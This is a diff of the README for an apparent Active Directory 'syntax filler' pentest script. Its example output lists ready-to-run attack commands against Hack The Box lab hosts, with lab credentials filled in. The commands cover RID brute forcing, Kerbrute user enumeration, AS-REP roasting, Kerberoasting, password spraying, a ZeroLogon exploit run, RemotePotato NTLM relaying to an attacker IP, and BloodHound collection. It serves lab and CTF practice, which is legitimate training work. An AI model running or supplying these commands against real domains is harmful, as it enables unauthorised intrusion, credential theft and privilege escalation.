@@ -1,51 +1,49 @@
-Converts hostname, ip, creds, and more into the most common commands used during innitial AD enumeration.
-Example output: 
+  Enter in info about a target, and the script will fill out the most common commands for you! 
+  Example Output:   
+# Zone transfer (Unlikely with AD)
+dig axfr htb.local @10.10.10.161
 
-           (  )   /\   _                 (
-            \ |  (  \ ( \.(               )            _____
-          \  \ \  `  `   ) \             (  ___                 (  )   /\   _
-       (_`    \+   . x   ( .\            \/   \          )      \ |  (  \ ( \.(               )            _____
-      - .-               \+  ;          (     )        (  (     \  \ \  `  `   ) \             (  ___
-           WELCOME TO      )  )        _)   ) _         )  )      (_`    \+   . x   ( .\            \/   \
-         THE AD SYNTAX   (__/          \____/          (_(_()   - .-               \+  ;          (     )
-               FILLER,    /             /               /                        )  )        _)   ) _
-           SAVING YOU    (             (               /    made with love by bandors (__/          \____/
-              TIME SINCE  2024
+# Guest RID brute
+netexec smb htb.local -u anonymous -p '' --rid-brute 10000
+impacket-lookupsid htb.local/anonymous@10.10.10.161
 
-    
-# RID brute
-crackmapexec smb intelligence.htb -u anonymous -p '' --rid-brute 10000
-impacket-lookupsid intelligence.htb/anonymous@10.10.10.248
-netexec smb intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --rid-brute 10000
-
-# With credentials
-impacket-lookupsid intelligence.htb/Tiffany.Molina:'NewIntelligenceCorpUser9876'@intelligence.htb
+# Authenticated RID brute
+netexec smb htb.local -u svc-alfresco -p 's3rvice' --rid-brute 10000
+impacket-lookupsid htb.local/svc-alfresco:'s3rvice'@htb.local
 
 # Kerbrute user enumeration
-kerbrute userenum -d intelligence.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.248
+kerbrute userenum -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.161
+
+# RPC Enumeration
+rpcclient -U "svc-alfresco" -N 10.10.10.161
 
 # AS Rep Roasting
-for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/Tiffany.Molina | grep -v Impacket; done
+for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb.local/${user} | grep -v Impacket; done
 
 # Kerberoasting
-faketime -f +7h GetUserSPNs.py -target-domain intelligence.htb -usersfile users.txt -dc-ip dc01.intelligence.htb intelligence.htb/guest -no-pass
-faketime -f +7h GetUserSPNs.py -request -dc-ip 10.10.10.248 intelligence.htb/Tiffany.Molina -save -outputfile GetUserSPNs.out
-GetUserSPNs.py -no-preauth 'jjones' -usersfile 'users.txt' -dc-host 'dc01.intelligence.htb' 'intelligence.htb'/
+faketime -f +7h GetUserSPNs.py -target-domain htb.local -usersfile users.txt -dc-ip FOREST.htb.local htb.local/guest -no-pass
+faketime -f +7h GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco -save -outputfile GetUserSPNs.out
+GetUserSPNs.py -no-preauth 'svc-alfresco' -usersfile 'users.txt' -dc-host 'FOREST.htb.local' 'htb.local'/
 
 # Password Spray
-netexec smb 10.10.10.248 -u users.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success
+netexec smb 10.10.10.161 -u users.txt -p 's3rvice' --continue-on-success
 
 # LDAP Enumeration
-ldapsearch -x -H ldap://10.10.10.248 -b "dc=intelligence,dc=htb" | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}' > users.txt
-~/go/bin/kerbrute userenum --dc dc01.intelligence.htb -d intelligence.htb users.txt
+ldapsearch -x -H ldap://10.10.10.161 -b "dc=htb,dc=local" | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}' > users.txt
+kerbrute userenum --dc FOREST.htb.local -d htb.local users.txt
 
 # ZeroLogon Check
-sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py dc01 10.10.10.248
+sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py FOREST 10.10.10.161
 
 # RemotePotato Check
-sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.10.248:9999
-sudo impacket-ntlmrelayx -t ldap://10.10.10.248 --no-wcf-server --escalate-user normal_user
-.\RemotePotato0.exe -m 2 -r 10.8.0.22 -x 10.8.0.22 -p 9999 -s 1
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.10.161:9999
+sudo impacket-ntlmrelayx -t ldap://10.10.10.161 --no-wcf-server --escalate-user normal_user
+.\RemotePotato0.exe -m 2 -r 10.10.14.2 -x 10.10.14.2 -p 9999 -s 1
 
-# Bloodhound Python
-faketime -f +7h bloodhound-python -c ALL -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -d intelligence.htb -dc dc01.intelligence.htb -ns 10.10.10.248
+# Bloodhound Python injestor
+faketime -f +7h bloodhound-python -c ALL -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc FOREST.htb.local -ns 10.10.10.161
+
+# Powerview.py enumeration
+faketime -f +7h getTGT.py htb.local/svc-alfresco:'s3rvice'
+export KRB5CCNAME=./svc-alfresco.ccache
+faketime -f +7h powerview htb.local/svc-alfresco@10.10.10.161 -k --no-pass --dc-ip 10.10.10.161
